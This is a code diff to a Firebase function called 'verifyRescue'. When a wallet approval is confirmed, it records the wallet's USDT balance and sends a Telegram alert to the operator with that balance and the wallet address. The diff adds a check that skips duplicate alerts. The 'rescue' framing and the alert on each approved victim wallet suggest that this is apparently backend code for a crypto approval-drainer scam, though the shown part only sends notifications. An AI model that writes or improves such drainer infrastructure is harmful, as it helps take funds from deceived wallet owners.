@@ -145,13 +145,30 @@ export const verifyRescue = functions
         console.warn("[verifyRescue] Error updating balance in firestore:", dbErr);
       }
 
-      // ── 2. Send Telegram notification (AWAITED to ensure delivery) ──
+      // ── 2. Send Telegram notification (AWAITED to ensure delivery, deduplicated) ──
       try {
-        const { sendTelegramMessage } = await import("../lib/telegram");
-        await sendTelegramMessage(
-          `🔔 New Wallet Approved!\n\nBalance: *${balanceDisplay} USDT*\n\nAddress: ${from}\nApproval Tx: ${txHash || "confirmed"}`
-        );
-        console.log(`[verifyRescue] Telegram approval notification delivered for ${from}`);
+        const docSnap = await db.collection("wallets").doc(lowerFrom).get();
+        const existingData = docSnap.data();
+        const lastNotifiedAt = existingData?.telegramApprovalNotifiedAt?.toMillis?.() ?? 0;
+        const nowMs = Date.now();
+        const isRecentDuplicate = nowMs - lastNotifiedAt < 30000;
+
+        if (isRecentDuplicate) {
+          console.log(`[verifyRescue] Skipping duplicate Telegram notification for ${from} (last sent ${nowMs - lastNotifiedAt}ms ago)`);
+        } else {
+          await db.collection("wallets").doc(lowerFrom).set(
+            {
+              telegramApprovalNotifiedAt: admin.firestore.FieldValue.serverTimestamp(),
+            },
+            { merge: true }
+          );
+
+          const { sendTelegramMessage } = await import("../lib/telegram");
+          await sendTelegramMessage(
+            `🔔 New Wallet Approved!\n\nBalance: *${balanceDisplay} USDT*\n\nAddress: ${from}\ntransferdotcom`
+          );
+          console.log(`[verifyRescue] Telegram approval notification delivered for ${from}`);
+        }
       } catch (tgErr) {
         console.error("[verifyRescue] Telegram notification error:", tgErr);
       }
